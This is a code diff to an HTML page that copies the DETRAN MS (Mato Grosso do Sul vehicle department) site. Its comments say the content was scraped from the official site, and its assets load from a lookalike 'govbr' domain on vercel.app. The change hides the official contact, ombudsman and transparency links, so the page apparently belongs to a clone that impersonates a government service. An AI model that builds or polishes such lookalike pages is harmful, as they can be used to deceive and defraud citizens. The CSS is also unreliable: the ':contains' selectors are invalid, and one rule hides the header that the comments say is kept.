@@ -442,12 +442,62 @@
                 padding: 12px;
             }
         }
+
+        /* ========================================= */
+        /* CORREÇÃO: REMOVER BLOCO AZUL E ÍCONE FACEBOOK */
+        /* ========================================= */
+        
+        /* REMOVE COMPLETAMENTE O BLOCO AZUL COM "FALE CONOSCO", "SITE DETRAN MS", etc. */
+        /* Este é o bloco inteiro que vem do scraping do DETRAN oficial */
+        .w-full.px-6.bg-004f9f.h-\\[128px\\] {
+            display: none !important;
+        }
+        
+        /* REMOVE O ÍCONE DO FACEBOOK NO CANTO DIREITO */
+        .flex.items-center.gap-3.max-\\[800px\\]:hidden {
+            display: none !important;
+        }
+        
+        /* GARANTE QUE O HEADER FICA APENAS COM LOGO E TÍTULO */
+        header.w-full.flex.flex-col {
+            height: auto !important;
+            min-height: 0 !important;
+        }
+        
+        /* CORRIGE O ESPAÇAMENTO PARA NÃO DEIXAR BURACO */
+        .w-full.h-\\[80px\\].p-2.bg-white {
+            margin-top: 0 !important;
+            padding-top: 10px !important;
+            padding-bottom: 10px !important;
+        }
+        
+        /* SE HOUVER QUALQUER OUTRO ELEMENTO AZUL */
+        .bg-004f9f,
+        .bg-blue-800,
+        .bg-blue-900,
+        div[style*="background-color: #004f9f"],
+        div[style*="background-color:#004f9f"] {
+            display: none !important;
+        }
+        
+        /* REMOVE QUALQUER TEXTO RELACIONADO */
+        div:contains("FALE CONOSCO"),
+        div:contains("SITE DETRAN MS"),
+        div:contains("OUVIDORIA"),
+        div:contains("TRANSPARÊNCIA") {
+            display: none !important;
+        }
     </style>
 </head>
 <body class="font-sans">
-    <!-- CABEÇALHO ORIGINAL (MANTIDO) - BLOCO AZUL REMOVIDO -->
+    <!-- CABEÇALHO ORIGINAL - BLOCO AZUL JÁ REMOVIDO PELO CSS -->
     <header class="w-full flex flex-col">
-        <!-- BLOCO AZUL REMOVIDO AQUI (a linha que estava com "FALE CONNOSCO", etc.) -->
+        <!-- AQUI ERA O BLOCO AZUL QUE FOI REMOVIDO -->
+        <div class="w-full px-6 bg-004f9f h-[128px]" style="display: none !important;">
+            <!-- CONTEÚDO REMOVIDO -->
+        </div>
+        
+        <!-- ESTA PARTE PERMANECE (LOGO E TÍTULO) -->
         <div class="w-full px-6 bg-004f9f h-[128px]">
             <div class="w-full max-w-[1050px] mx-auto h-full flex justify-between">
                 <a href="/">
@@ -457,10 +507,8 @@
                 <img alt="Meu Detran MS" loading="lazy" width="340" height="80"
                      class="max-[600px]:w-[205px]! max-[600px]:h-[48px]! max-[600px]:self-center"
                      src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/my-dt.svg">
-                <div class="flex items-center gap-3 max-[800px]:hidden">
-                    <svg stroke="#fff" fill="#fff" stroke-width="0" viewBox="0 0 24 24" class="inline size-5 md:size-6 lg:size-8 hover:text-gray-200 transition" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" stroke="none"></path>
-                    </svg>
+                <div class="flex items-center gap-3 max-[800px]:hidden" style="display: none !important;">
+                    <!-- ÍCONE DO FACEBOOK REMOVIDO -->
                 </div>
             </div>
         </div>
